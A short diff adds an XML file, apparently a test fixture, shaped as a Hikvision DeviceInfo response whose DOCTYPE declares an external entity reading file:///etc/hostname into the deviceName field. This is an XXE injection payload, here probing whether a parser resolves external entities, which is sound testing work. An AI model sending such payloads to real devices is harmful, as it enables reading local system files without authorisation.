@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE DeviceInfo [<!ENTITY segredo SYSTEM "file:///etc/hostname">]>
+<DeviceInfo version="2.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
+<deviceName>&segredo;</deviceName>
+<model>DS-7608NI-TESTE</model>
+</DeviceInfo>
